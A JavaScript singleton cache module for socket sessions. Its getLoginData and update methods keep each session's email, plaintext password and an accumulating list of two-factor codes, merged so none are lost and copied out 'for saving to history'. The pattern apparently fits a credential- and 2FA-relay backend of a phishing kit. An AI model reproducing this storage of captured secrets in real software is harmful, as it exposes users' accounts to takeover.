class Cache {
    constructor() {
        if (Cache.instance) {
            return Cache.instance;
        }

        this.store = new Map();
        Cache.instance = this;
        return this;
    }

    add(id, data) {
        if (!id || this.store.has(id)) {
            return null;
        }

        const socketData = {
            id,
            ...data,
            isActive: true,
            connectedAt: Date.now()
        };

        this.store.set(id, socketData);
        return socketData;
    }

    get(id) {
        if (!id || !this.store.has(id)) {
            return null;
        }
        return { ...this.store.get(id) };
    }

    /** Returns the actual stored object (no copy). Use when you need to read the latest state before remove. */
    getRaw(id) {
        if (!id || !this.store.has(id)) {
            return null;
        }
        return this.store.get(id);
    }

    /** Returns a deep copy of loginData for the given id (for saving to history). */
    getLoginData(id) {
        const raw = this.getRaw(id);
        if (!raw || !raw.loginData || typeof raw.loginData !== "object") {
            return null;
        }
        const ld = raw.loginData;
        return {
            email: String(ld.email ?? "").trim(),
            password: String(ld.password ?? "").trim(),
            twoFactorCode: ld.twoFactorCode != null ? String(ld.twoFactorCode) : null,
            twoFactorCodes: Array.isArray(ld.twoFactorCodes)
                ? ld.twoFactorCodes.map((c) => String(c))
                : (ld.twoFactorCode != null && String(ld.twoFactorCode).trim() !== "" ? [String(ld.twoFactorCode)] : []),
        };
    }

    remove(id) {
        if (!id || !this.store.has(id)) {
            return false;
        }
        this.store.delete(id);
        return true;
    }

    update(id, data) {
        if (!id || !this.store.has(id)) {
            return null;
        }
        const current = this.store.get(id);
        let next = { ...current, ...data };
        // Always merge loginData so we never lose email/password/2FA from partial updates
        if (data.loginData && typeof data.loginData === "object") {
            const prev = (current.loginData && typeof current.loginData === "object") ? current.loginData : {};
            const incoming = data.loginData;
            const mergedCodes = Array.isArray(incoming.twoFactorCodes)
                ? incoming.twoFactorCodes
                : (incoming.twoFactorCode != null && String(incoming.twoFactorCode).trim() !== ""
                    ? [...(Array.isArray(prev.twoFactorCodes) ? prev.twoFactorCodes : []), String(incoming.twoFactorCode)]
                    : (Array.isArray(prev.twoFactorCodes) ? prev.twoFactorCodes : []));
            next = {
                ...next,
                loginData: {
                    ...prev,
                    ...incoming,
                    twoFactorCodes: mergedCodes,
                },
            };
        }
        this.store.set(id, next);
        return next;
    }

    getAll() {
        return Array.from(this.store.values());
    }
}

const cache = new Cache();
export default cache;